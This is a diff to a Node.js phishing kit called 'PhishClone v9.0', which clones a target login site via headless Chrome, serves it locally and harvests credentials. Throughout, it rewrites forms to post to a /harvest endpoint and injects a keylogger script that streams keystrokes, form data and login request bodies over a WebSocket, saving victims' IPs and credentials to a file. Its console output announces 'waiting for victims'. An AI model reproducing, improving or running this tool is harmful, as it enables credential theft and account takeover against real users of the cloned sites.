@@ -1,20 +1,22 @@
 #!/usr/bin/env node
 /**
- * phantom-arsenal / PhishClone v8.0
- * RADICAL FIX: Chrome DevTools Protocol (CDP) Network.getResponseBody
- * → intercepts EVERY response INSIDE Chrome before CORS applies
- * → inlines all CSS/JS/fonts/images as base64 data URIs
- * → victim browser loads NOTHING external — 100% local
+ * phantom-arsenal / PhishClone v9.0
+ * FULL OFFLINE SCRAPE:
+ * 1. Chrome loads the page → CDP captures EVERY response body (CSS/JS/fonts/images)
+ * 2. All assets saved as real files in ./site_cache/<hash>
+ * 3. HTML rewritten to use local paths
+ * 4. Local HTTP server serves EVERYTHING from disk — zero external requests
  */
 
 import puppeteer        from 'puppeteer'
 import net              from 'net'
 import fs               from 'fs'
+import path             from 'path'
 import readline         from 'readline'
 import { createServer } from 'http'
 import { createHash }   from 'crypto'
 
-// ── Chrome path ───────────────────────────────────────────────────────────────
+// ── Chrome ────────────────────────────────────────────────────────────────────
 function findChrome() {
   try {
     const base = '/root/.cache/puppeteer/chrome'
@@ -30,10 +32,11 @@ function findChrome() {
 const CHROME = findChrome()
 if (!CHROME) { console.error('❌ Chrome not found'); process.exit(1) }
 
-const CREDS_FILE = 'captured_creds.json'
-const LOG_FILE   = 'keystrokes.log'
+// ── utils ─────────────────────────────────────────────────────────────────────
+const CREDS_FILE  = 'captured_creds.json'
+const LOG_FILE    = 'keystrokes.log'
+const CACHE_DIR   = './site_cache'
 
-function log(m)    { fs.appendFileSync(LOG_FILE, m + '\n') }
 function freePort(s) {
   return new Promise(r => {
     const sv = net.createServer()
@@ -41,6 +44,47 @@ function freePort(s) {
     sv.on('error', () => freePort(s+1).then(r))
   })
 }
+function urlToFilename(url, ct) {
+  const hash = createHash('md5').update(url).digest('hex').slice(0,10)
+  const ext  = guessExt(url, ct)
+  return hash + ext
+}
+function guessExt(url, ct='') {
+  const u = url.split('?')[0].toLowerCase()
+  if (u.endsWith('.css')  || ct.includes('css'))         return '.css'
+  if (u.endsWith('.js')   || ct.includes('javascript'))  return '.js'
+  if (u.endsWith('.svg')  || ct.includes('svg'))         return '.svg'
+  if (u.endsWith('.png')  || ct.includes('png'))         return '.png'
+  if (u.endsWith('.jpg')  || u.endsWith('.jpeg') || ct.includes('jpeg')) return '.jpg'
+  if (u.endsWith('.gif')  || ct.includes('gif'))         return '.gif'
+  if (u.endsWith('.webp') || ct.includes('webp'))        return '.webp'
+  if (u.endsWith('.woff2')|| ct.includes('woff2'))       return '.woff2'
+  if (u.endsWith('.woff') || ct.includes('woff'))        return '.woff'
+  if (u.endsWith('.ttf')  || ct.includes('ttf'))         return '.ttf'
+  if (u.endsWith('.ico')  || ct.includes('icon'))        return '.ico'
+  if (u.endsWith('.json') || ct.includes('json'))        return '.json'
+  if (ct.includes('image'))                              return '.img'
+  if (ct.includes('font'))                               return '.font'
+  return '.bin'
+}
+function ctForExt(ext) {
+  const m = {
+    '.css':'.css','.js':'application/javascript',
+    '.svg':'image/svg+xml','.png':'image/png','.jpg':'image/jpeg',
+    '.gif':'image/gif','.webp':'image/webp','.woff2':'font/woff2',
+    '.woff':'font/woff','.ttf':'font/ttf','.ico':'image/x-icon',
+    '.json':'application/json','.html':'text/html'
+  }
+  const full = {
+    '.css':'text/css','.js':'application/javascript',
+    '.svg':'image/svg+xml','.png':'image/png','.jpg':'image/jpeg',
+    '.gif':'image/gif','.webp':'image/webp','.woff2':'font/woff2',
+    '.woff':'font/woff','.ttf':'font/ttf','.ico':'image/x-icon',
+    '.json':'application/json','.html':'text/html'
+  }
+  return full[ext] || 'application/octet-stream'
+}
+function log(m) { fs.appendFileSync(LOG_FILE, m+'\n') }
 function saveCred(ip, data, target) {
   let a=[]; try{a=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))}catch{}
   a.push({ time: new Date().toISOString(), ip, target, credentials: data })
@@ -48,26 +92,11 @@ function saveCred(ip, data, target) {
   console.log('\n\x1b[41m\x1b[97m [CAPTURED] IP='+ip+' → '+JSON.stringify(data)+' \x1b[0m\n')
 }
 
-// mime → data URI prefix
-function mimePrefix(ct) {
-  if (!ct) return 'application/octet-stream'
-  if (ct.includes('css'))         return 'text/css'
-  if (ct.includes('javascript'))  return 'application/javascript'
-  if (ct.includes('svg'))         return 'image/svg+xml'
-  if (ct.includes('png'))         return 'image/png'
-  if (ct.includes('jpeg')||ct.includes('jpg')) return 'image/jpeg'
-  if (ct.includes('gif'))         return 'image/gif'
-  if (ct.includes('webp'))        return 'image/webp'
-  if (ct.includes('woff2'))       return 'font/woff2'
-  if (ct.includes('woff'))        return 'font/woff'
-  if (ct.includes('ttf'))         return 'font/ttf'
-  if (ct.includes('icon'))        return 'image/x-icon'
-  return ct.split(';')[0].trim()
-}
+// ── scrape ────────────────────────────────────────────────────────────────────
+async function scrapeAndClone(targetUrl, wsPort) {
+  if (!fs.existsSync(CACHE_DIR)) fs.mkdirSync(CACHE_DIR, { recursive: true })
 
-// ── clone page via CDP ────────────────────────────────────────────────────────
-async function clonePage(targetUrl, wsPort) {
-  console.log('[*] Launching Chrome with CDP network interception...')
+  console.log('\n[*] Launching Chrome with CDP full capture...')
 
   const browser = await puppeteer.launch({
     headless: true,
@@ -75,60 +104,66 @@ async function clonePage(targetUrl, wsPort) {
     args: ['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-gpu']
   })
 
-  const page    = await browser.newPage()
-  const client  = await page.createCDPSession()
+  const page   = await browser.newPage()
+  const client = await page.createCDPSession()
 
   await page.setViewport({ width: 1280, height: 900 })
   await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36')
-
-  // Enable CDP Network domain
   await client.send('Network.enable')
 
-  // Store every response body INSIDE Chrome (no CORS restriction here)
-  const responseMap = new Map()  // requestId → { url, ct, base64body }
-  const urlToDataURI = new Map() // original url → data URI
+  // url → local filename mapping
+  const urlToFile = new Map()
 
-  const SKIP_URL = /analytics|gtag|google-analytics|doubleclick|facebook\.net\/signals|ads\.twitter/i
-  const ASSET_TYPE = /\.(css|js|woff2?|ttf|eot|otf|svg|png|jpe?g|gif|webp|ico)(\?.*)?$/i
+  const SKIP = /google-analytics|googletagmanager|doubleclick|facebook\.net\/signals|connect\.facebook\.net|ads\.|analytics\./i
 
+  // capture every response body via CDP
   client.on('Network.responseReceived', async ev => {
     const { requestId, response } = ev
     const { url, mimeType, headers } = response
-    const ct = mimeType || headers['content-type'] || ''
+    const ct = mimeType || (headers && headers['content-type']) || ''
 
-    if (SKIP_URL.test(url)) return
-    if (!ASSET_TYPE.test(url.split('?')[0]) &&
-        !ct.includes('css') && !ct.includes('javascript') &&
-        !ct.includes('font') && !ct.includes('image') && !ct.includes('svg')) return
+    if (SKIP.test(url)) return
+    if (url.startsWith('data:')) return
+
+    // capture CSS, JS, fonts, images only
+    const isAsset = /\.(css|js|woff2?|ttf|eot|otf|svg|png|jpe?g|gif|webp|ico|map)(\?|$)/i.test(url) ||
+                    ct.includes('css') || ct.includes('javascript') ||
+                    ct.includes('font') || ct.includes('image') || ct.includes('svg')
+    if (!isAsset) return
 
     try {
       const { body, base64Encoded } = await client.send('Network.getResponseBody', { requestId })
-      const b64 = base64Encoded ? body : Buffer.from(body).toString('base64')
-      const mime = mimePrefix(ct)
-      const dataURI = `data:${mime};base64,${b64}`
-      urlToDataURI.set(url, dataURI)
+      const buf = base64Encoded ? Buffer.from(body, 'base64') : Buffer.from(body, 'utf8')
+      const filename = urlToFilename(url, ct)
+      const filepath = path.join(CACHE_DIR, filename)
+      fs.writeFileSync(filepath, buf)
+      urlToFile.set(url, filename)
+      process.stdout.write('\r[+] Cached: ' + urlToFile.size + ' files    ')
     } catch (_) {}
   })
 
-  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 40000 })
+  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 45000 })
   await new Promise(r => setTimeout(r, 3000))
 
   const finalUrl = page.url()
   let html = await page.content()
   await browser.close()
+  console.log('\n[+] Rendered: ' + (html.length/1024).toFixed(1) + ' KB | Files saved: ' + urlToFile.size)
 
-  console.log('[+] Rendered: ' + (html.length/1024).toFixed(1) + ' KB')
-  console.log('[+] Assets captured via CDP: ' + urlToDataURI.size)
-
-  // inline every captured asset as data URI
-  let inlined = 0
-  for (const [origUrl, dataURI] of urlToDataURI) {
+  // replace all remote URLs with /assets/filename
+  let replaced = 0
+  for (const [origUrl, filename] of urlToFile) {
     if (html.includes(origUrl)) {
-      html = html.split(origUrl).join(dataURI)
-      inlined++
+      html = html.split(origUrl).join('/assets/' + filename)
+      replaced++
     }
   }
-  console.log('[+] Inlined: ' + inlined + ' assets into HTML')
+  console.log('[+] Replaced ' + replaced + ' URLs → local paths')
+
+  // remove any remaining absolute URLs for assets (fallback)
+  // strip integrity checks that would block local files
+  html = html.replace(/\s*integrity="[^"]*"/gi, '')
+  html = html.replace(/\s*crossorigin="[^"]*"/gi, '')
 
   // patch forms
   html = html
@@ -137,20 +172,21 @@ async function clonePage(targetUrl, wsPort) {
     .replace(/(<form)(?![^>]*action=)([^>]*>)/gi, '$1 action="/harvest"$2')
     .replace(/(<form[^>]*)\s+method="get"/gi,     '$1 method="POST"')
 
-  const redirectUrl = finalUrl.replace(/'/g, "\\'")
+  const redirectUrl = finalUrl.replace(/\\/g, '\\\\').replace(/'/g, "\\'")
 
+  // harvester + keylogger script
   const script = `<script>
 (function(){
   var ws;
   function cws(){try{ws=new WebSocket('ws://'+location.hostname+':${wsPort}');ws.onclose=function(){setTimeout(cws,2000)};}catch(e){}}
   cws();
   function snd(t,d){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:t,data:d,ts:new Date().toISOString()}));}
-  // keystrokes
+
   document.addEventListener('keyup',function(e){
     var t=e.target;
     snd('keystroke',{key:e.key,field:t.name||t.id||t.placeholder||t.type||'?',value:t.value});
   },true);
-  // form submit
+
   document.addEventListener('submit',function(e){
     e.preventDefault();var f=e.target,d={};
     new FormData(f).forEach(function(v,k){d[k]=v;});
@@ -158,7 +194,7 @@ async function clonePage(targetUrl, wsPort) {
     fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
       .then(function(){window.location='${redirectUrl}';});
   },true);
-  // button clicks
+
   document.addEventListener('click',function(e){
     var el=e.target;
     if(el&&(el.type==='submit'||el.tagName==='BUTTON')){
@@ -167,7 +203,7 @@ async function clonePage(targetUrl, wsPort) {
       if(Object.keys(d).length)snd('click_harvest',d);
     }
   },true);
-  // XHR patch
+
   var oX=XMLHttpRequest.prototype.open,oS=XMLHttpRequest.prototype.send;
   XMLHttpRequest.prototype.open=function(m,u){this._u=u;return oX.apply(this,arguments);};
   XMLHttpRequest.prototype.send=function(b){
@@ -175,13 +211,12 @@ async function clonePage(targetUrl, wsPort) {
       try{snd('xhr',{url:this._u,body:String(b)});}catch(e){}
     return oS.apply(this,arguments);
   };
-  // fetch patch
+
   var oF=window.fetch;
   window.fetch=function(i,init){
     var u=typeof i==='string'?i:(i&&i.url)||'';
     if(/login|auth|session|signin/i.test(u)){
-      var b=(init&&init.body)||'';
-      try{snd('fetch_login',{url:u,body:String(b)});}catch(e){}
+      var b=(init&&init.body)||'';try{snd('fetch_login',{url:u,body:String(b)});}catch(e){}
     }
     return oF.apply(this,arguments);
   };
@@ -189,10 +224,15 @@ async function clonePage(targetUrl, wsPort) {
 </script></body>`
 
   html = /<\/body>/i.test(html) ? html.replace(/<\/body>/i, script) : html + script
-  return { html, finalUrl }
+
+  // save final HTML to disk too
+  fs.writeFileSync(path.join(CACHE_DIR, 'index.html'), html)
+  console.log('[+] Saved to ' + CACHE_DIR + '/index.html')
+
+  return { html, finalUrl, urlToFile }
 }
 
-// ── WebSocket (stdlib) ────────────────────────────────────────────────────────
+// ── WebSocket (raw TCP stdlib) ────────────────────────────────────────────────
 function startWS(port) {
   net.createServer(sock => {
     let shook=false, buf=Buffer.alloc(0)
@@ -252,10 +292,10 @@ async function askTarget() {
   const rl=readline.createInterface({input:process.stdin,output:process.stdout})
   const ask=q=>new Promise(r=>rl.question(q,r))
   console.clear()
-  console.log('\x1b[96m╔══════════════════════════════════════════════════╗')
-  console.log('║   phantom-arsenal — PhishClone v8.0             ║')
-  console.log('║   CDP Interception • Perfect Clone • No CORS    ║')
-  console.log('╚══════════════════════════════════════════════════╝\x1b[0m\n')
+  console.log('\x1b[96m╔════════════════════════════════════════════════════╗')
+  console.log('║   phantom-arsenal — PhishClone v9.0               ║')
+  console.log('║   Full Offline Scrape • Serve 100% Locally        ║')
+  console.log('╚════════════════════════════════════════════════════╝\x1b[0m\n')
   SITES.forEach((s,i)=>console.log('  \x1b[96m['+String(i+1).padStart(2)+'] \x1b[0m'+s.name))
   console.log('')
   let target=null
@@ -274,31 +314,55 @@ const targetUrl = process.argv[2] || await askTarget()
 const PORT      = await freePort(parseInt(process.argv[3]||'8080'))
 const WS_PORT   = await freePort(PORT+1)
 
-const { html, finalUrl } = await clonePage(targetUrl, WS_PORT)
+const { html, finalUrl } = await scrapeAndClone(targetUrl, WS_PORT)
 startWS(WS_PORT)
 
 createServer((req, res) => {
-  const p = new URL(req.url, 'http://x').pathname
-  if (p==='/') {
-    const b=Buffer.from(html,'utf8')
-    res.writeHead(200,{'Content-Type':'text/html;charset=utf-8','Content-Length':b.length}); res.end(b)
-  } else if (p==='/creds') {
+  const p = decodeURIComponent(new URL(req.url, 'http://x').pathname)
+
+  if (p === '/') {
+    const b = Buffer.from(html, 'utf8')
+    res.writeHead(200, { 'Content-Type':'text/html;charset=utf-8', 'Content-Length':b.length })
+    res.end(b)
+
+  } else if (p.startsWith('/assets/')) {
+    const filename = p.slice(8)
+    const filepath = path.join(CACHE_DIR, filename)
+    if (fs.existsSync(filepath)) {
+      const ext  = path.extname(filename)
+      const ct   = ctForExt(ext)
+      const data = fs.readFileSync(filepath)
+      res.writeHead(200, {
+        'Content-Type': ct,
+        'Cache-Control': 'max-age=86400',
+        'Access-Control-Allow-Origin': '*'
+      })
+      res.end(data)
+    } else {
+      res.writeHead(404); res.end()
+    }
+
+  } else if (p === '/creds') {
     let b='[]'; try{b=fs.readFileSync(CREDS_FILE,'utf8')}catch{}
-    res.writeHead(200,{'Content-Type':'application/json'}); res.end(b)
-  } else if (p==='/harvest' && req.method==='POST') {
+    res.writeHead(200, {'Content-Type':'application/json'}); res.end(b)
+
+  } else if (p === '/harvest' && req.method === 'POST') {
     let body=''
-    req.on('data',c=>body+=c)
-    req.on('end',()=>{
+    req.on('data', c => body+=c)
+    req.on('end', () => {
       let data; try{data=JSON.parse(body)}catch{data=Object.fromEntries(new URLSearchParams(body))}
-      saveCred(req.socket.remoteAddress||'?',data,finalUrl)
-      res.writeHead(200,{'Content-Type':'application/json'}); res.end('{"ok":true}')
+      saveCred(req.socket.remoteAddress||'?', data, finalUrl)
+      res.writeHead(200, {'Content-Type':'application/json'}); res.end('{"ok":true}')
     })
+
   } else { res.writeHead(404); res.end() }
+
 }).listen(PORT, () => {
   console.log('\n[+] WebSocket  : ws://0.0.0.0:' + WS_PORT)
   console.log('[+] Phishing   : \x1b[92mhttp://0.0.0.0:' + PORT + '\x1b[0m')
-  console.log('[+] View Creds : http://0.0.0.0:' + PORT + '/creds')
-  console.log('\x1b[93m[*] Ready — waiting for victims...\x1b[0m\n')
+  console.log('[+] Creds      : http://0.0.0.0:' + PORT + '/creds')
+  console.log('[+] Cache dir  : ' + path.resolve(CACHE_DIR))
+  console.log('\x1b[93m[*] Fully offline — zero external requests from victim\x1b[0m\n')
 })
 
 process.on('SIGINT', () => {
